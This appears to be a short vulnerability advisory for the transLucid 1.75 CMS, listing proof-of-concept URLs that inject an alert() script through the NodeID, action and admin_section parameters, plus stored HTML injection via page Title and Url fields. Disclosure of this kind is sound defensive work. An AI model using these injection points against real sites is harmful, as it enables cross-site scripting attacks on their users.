-:: The Advisory ::-

Vulnerable Function / ID Calls:
NodeID & action (vulnerable in both admin and public panels)

Cross Site Scripting: (anyone - this was tested with public mode on)
1)
http://[HOST]/translucid/transLucid_175/?NodeID="><script>alert(0)</script>
2)
http://[HOST]/translucid/transLucid_175/?action="><script>alert(0)</script>
(found by macd3v)
3)
http://[HOST]/translucid/transLucid_175/?admin_section=1&NodeID="><script>alert(0)</script>
-- Number 3 might require moderator or administrative access if public
mode is not turned on.

HTML Injection:
- If public mode is on / chosen, editing the following page-fields will
result in script execution: Title & Url

Adding a new page can result in HTML Injection too. (Parent & Child
pages were fully tested.)

Affected Sites by HTML Injection: (there will most likely be a lot more.)
http://[HOST]/translucid/transLucid_175/?action=switchto_editmode
-- In the admin panel "> needs to be prepended most likely in order to
execute the injection.
--=-- Switching the theme to Developer can result in HTML Injection if
there is any injected.

-:: Solution ::-
Regular expression match and / or bad characters conversion rocks!

Conclusion:
Easy to install and use, but the code should have been reviewed long ago.
